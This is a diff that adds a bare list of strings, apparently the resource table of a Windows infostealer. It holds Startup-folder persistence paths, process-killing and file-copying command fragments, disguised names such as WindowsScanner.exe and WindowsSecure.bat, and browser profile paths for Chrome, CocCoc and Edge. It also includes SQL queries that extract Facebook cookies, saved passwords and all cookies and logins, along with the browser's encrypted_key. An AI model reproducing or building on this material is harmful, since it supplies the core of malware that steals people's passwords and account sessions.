@@ -1,0 +1,40 @@
+C:\Users\
+\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+\AppData\MyDrivers
+mkdir 
+copy 
+rename 
+taskkill /f /im 
+WindowsScanner.exe
+Win32SupportProduct.exe
+APPDATA
+\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\Google\\Chrome\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\CocCoc\\Browser\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Cookies
+\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\Microsoft\\Edge\\User Data\\Profile 
+\\Network\\Cookies
+\\Cookies
+USERPROFILE|AppData|Local|User Data|Local State
+CocCoc|Browser
+Google|Chrome
+Microsoft|Edge
+SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key
+os_crypt|encrypted_key
+fb
+SELECT username_value, password_value FROM logins WHERE origin_url LIKE '%facebook.com%' ORDER BY origin_url
+\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data
+\\..\\Local\\Google\\Chrome\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Login Data
+\\..\\Local\\CocCoc\\Browser\\User Data\\Profile 
+\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data
+\\..\\Local\\Microsoft\\Edge\\User Data\\Profile 
+\\Login Data
+USERNAME
+SELECT host_key, has_expires, path, is_secure, expires_utc, name, encrypted_value FROM Cookies ORDER BY host_key
+SELECT origin_url, username_value, password_value FROM logins  ORDER BY origin_url
+WindowsSecure.bat
+\\..\\Local\\Google\\Chrome\\User Data\\Default
+
